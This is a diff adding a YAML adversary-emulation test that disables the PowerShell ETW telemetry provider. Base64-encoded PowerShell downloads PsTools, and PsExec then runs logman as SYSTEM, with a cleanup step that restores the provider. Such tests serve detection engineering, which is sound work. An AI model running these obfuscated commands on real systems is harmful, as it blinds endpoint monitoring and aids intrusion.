@@ -1,0 +1,18 @@
+- id: 5df6be53-ab99-5712-b275-b7adceb9c61c
+  name: Soumaia ART Tests - Disable Powershell ETW Provider - Windows
+  description: This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions. (requires elevation)
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAHMAdABvAG8AbABzAFwAUABzAEUAeABlAGMALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZABvAHcAbgBsAG8AYQBkAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAGYAaQBsAGUAcwAvAFAAUwBUAG8AbwBsAHMALgB6AGkAcAAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAUwB0AG8AbwBsAHMALgB6AGkAcAAiAAoAZQB4AHAAYQBuAGQALQBhAHIAYwBoAGkAdgBlACAALQBsAGkAdABlAHIAYQBsAHAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAUABTAHQAbwBvAGwAcwAuAHoAaQBwACIAIAAtAGQAZQBzAHQAaQBuAGEAdABpAG8AbgBwAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHAAcwB0AG8AbwBsAHMAIgAgAC0AZgBvAHIAYwBlAA==
+          }
+          cmd /c "$env:TEMP\ART-ExternalPayloads\pstools\PsExec.exe" -accepteula -i -s cmd.exe /c logman update trace "EventLog-Application" --p "Microsoft-Windows-Powershell" -ets
+        cleanup: |-
+          cmd /c "$env:TEMP\ART-ExternalPayloads\pstools\PsExec.exe" -i -s cmd.exe /c logman update trace "EventLog-Application" -p "Microsoft-Windows-Powershell" -ets
